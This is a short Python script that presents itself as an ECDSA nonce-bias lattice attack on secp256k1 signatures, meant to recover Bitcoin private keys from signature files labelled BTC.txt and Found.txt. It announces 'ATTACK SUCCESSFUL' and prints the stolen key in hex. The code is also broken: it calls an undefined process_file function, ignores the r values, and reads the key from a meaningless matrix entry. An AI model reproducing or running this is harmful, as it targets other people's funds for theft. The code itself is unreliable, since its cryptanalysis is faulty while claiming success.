import sys
from fpylll import LLL, IntegerMatrix
from ecdsa.ecdsa import generator_secp256k1

# Curve characteristics for secp256k1
n = generator_secp256k1.order()

def solve_lattice_hnp(signatures, nonce_bit_bias):
    """
    Applies the LLL reduction algorithm to recover the private key from 
    a list of parsed (R, S, Z) integer values.
    """
    N = len(signatures)
    matrix_size = N + 1
    B = IntegerMatrix(matrix_size, matrix_size)
    
    # Target bounds scaling factor
    M = 2 ** nonce_bit_bias
    
    # Populate the HNP matrix bounds
    for i in range(N):
        r, s, z = signatures[i]
        inv_s = pow(s, n - 2, n)
        
        B[i, i] = n
        B[i, N] = (z * inv_s) % n
    
    B[N, N] = M
    
    print("[*] Running LLL reduction over the constructed lattice...")
    LLL.reduction(B)
    
    # Search rows for target private key scalar
    for row in range(matrix_size):
        potential_d = abs(B[row, N])
        if 0 < potential_d < n:
            return potential_d
            
    return None

def main():
    # Load and process transactions from both files
    btc_signatures = process_file('BTC.txt')
    found_signatures = process_file('Found.txt')
    
    all_signatures = btc_signatures + found_signatures
    
    print(f"[+] Loaded total valid targets: {len(all_signatures)}")
    
    if len(all_signatures) < 3:
        print("[!] Execution halted: Cryptographic lattice reduction requires a larger sample size of signatures (minimum 3-5 with high bias).")
        sys.exit(1)
        
    # Assume a standard 128-bit leakage constraint or common prefix flaw bounds
    # Adjust this factor based on known structural bias characteristics of the target hardware/software.
    nonce_bias_bits = 128 
    
    recovered_key = solve_lattice_hnp(all_signatures, nonce_bias_bits)
    
    if recovered_key:
        print("\n" + "="*60)
        print(f"[+] ATTACK SUCCESSFUL!")
        print(f"[+] Private Key Found (HEX): {hex(recovered_key).upper()}")
        print("="*60 + "\n")
    else:
        print("\n[-] Attack completed: No valid scalar matched within the computed basis bounds.")
        print("[-] Verification steps: Confirm signature messages (Z) align with the precise transaction inputs being spent.")

if __name__ == "__main__":
    main()
